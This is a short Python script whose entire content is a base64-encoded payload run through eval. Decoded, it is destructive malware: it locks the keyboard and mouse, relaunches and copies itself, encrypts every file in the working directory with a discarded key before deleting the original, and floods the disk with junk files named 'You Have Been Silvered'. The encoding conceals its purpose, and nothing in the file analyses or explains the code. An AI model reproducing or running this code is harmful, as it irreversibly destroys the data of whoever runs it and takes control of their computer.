from base64 import b64decode
eval(compile(b64decode(b'ZnJvbSBvcy5wYXRoIGltcG9ydCBpc2ZpbGUsIGlzZGlyLCBiYXNlbmFtZSwgc3BsaXRleHQKZnJvbSBvcyBpbXBvcnQgbGlzdGRpciwgc3RhcnRmaWxlLCByZW1vdmUsIGdldGN3ZApmcm9tIGNyeXB0b2dyYXBoeS5mZXJuZXQgaW1wb3J0IEZlcm5ldApmcm9tIGtleWJvYXJkIGltcG9ydCBibG9ja19rZXkKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZApmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGJ5dGVzCmZyb20gYXRleGl0IGltcG9ydCByZWdpc3Rlcgpmcm9tIGhhc2hsaWIgaW1wb3J0IG1kNQpmcm9tIG1vdXNlIGltcG9ydCBtb3ZlCmZyb20gc3lzIGltcG9ydCBhcmd2CgpyZWdpc3RlcigKICAgIHN0YXJ0ZmlsZSwKICAgIGFyZ3ZbMF0KKQoKcm9vdCA9IGdldGN3ZCgpCgpzdHJ1Y3R1cmUgPSBsaXN0ZGlyKCkKc3RydWN0dXJlLnJlbW92ZShiYXNlbmFtZShhcmd2WzBdKSkKCmRlZiBibG9ja0lucHV0KCk6CiAgICBmb3IgaSBpbiByYW5nZSgxNTApOgogICAgICAgIGJsb2NrX2tleShpKQoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgbW92ZSgwLCAwKQoKZGVmIGNsb25lKCk6CiAgICBmb3IgbmFtZSBpbiBzdHJ1Y3R1cmU6CiAgICAgICAgaWYgaXNkaXIobmFtZSk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZpbGVuYW1lID0gcm9vdCArICJcXCIgK21kNSggIAogICAgICAgICAgICAgICAgICAgIHJhbmRieXRlcygyNTYpCiAgICAgICAgICAgICAgICApLmhleGRpZ2VzdCgpICsgc3BsaXRleHQoCiAgICAgICAgICAgICAgICAgICAgYXJndlswXQogICAgICAgICAgICAgICAgKVsxXQoKICAgICAgICAgICAgICAgIG9wZW4oICAKICAgICAgICAgICAgICAgICAgICBmaWxlbmFtZSwgIAogICAgICAgICAgICAgICAgICAgICJ3IgogICAgICAgICAgICAgICAgKS53cml0ZSggIAogICAgICAgICAgICAgICAgICAgIG9wZW4oICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3ZbMF0sICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICJyIiAgCiAgICAgICAgICAgICAgICAgICAgKS5yZWFkKCkKICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICBzdGFydGZpbGUoZmlsZW5hbWUpCgogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChlKQoKZGVmIGRlbGV0ZUZpbGVzKCk6CiAgICBmb3IgbmFtZSBpbiBzdHJ1Y3R1cmU6CiAgICAgICAgaWYgaXNmaWxlKG5hbWUpIGFuZCBub3QgbmFtZS5zdGFydHN3aXRoKCJZb3UgSGF2ZSBCZWVuIFNpbHZlcmVkICIpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvcGVuKAogICAgICAgICAgICAgICAgICAgIG5hbWUsCiAgICAgICAgICAgICAgICAgICAgIndiIgogICAgICAgICAgICAgICAgKS53cml0ZSgKICAgICAgICAgICAgICAgICAgICBGZXJuZXQoCiAgICAgICAgICAgICAgICAgICAgICAgIEZlcm5ldC5nZW5lcmF0ZV9rZXkoKQogICAgICAgICAgICAgICAgICAgICkuZW5jcnlwdCgKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmIiCiAgICAgICAgICAgICAgICAgICAgICAgICkucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZW1vdmUobmFtZSkKCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGUpCgpkZWYgc3BhbSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNhbHQgPSBtZDUoCiAgICAgICAgICAgICAgICByYW5kYnl0ZXMoMTYpCiAgICAgICAgICAgICkuaGV4ZGlnZXN0KCkKCiAgICAgICAgICAgIG9wZW4oCiAgICAgICAgICAgICAgICBmIllvdSBIYXZlIEJlZW4gU2lsdmVyZWQge3NhbHR9IiwKICAgICAgICAgICAgICAgICJ3YiIKICAgICAgICAgICAgKS53cml0ZSgKICAgICAgICAgICAgICAgIHJhbmRieXRlcygyNTYpCiAgICAgICAgICAgICkKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChlKQoKVGhyZWFkKAogICAgdGFyZ2V0ID0gYmxvY2tJbnB1dAopLnN0YXJ0KCkKClRocmVhZCgKICAgIHRhcmdldCA9IGNsb25lCikuc3RhcnQoKQoKVGhyZWFkKAogICAgdGFyZ2V0ID0gZGVsZXRlRmlsZXMKKS5zdGFydCgpCgpUaHJlYWQoCiAgICB0YXJnZXQgPSBzcGFtCikuc3RhcnQoKQo=').decode(), '<string>', 'exec'))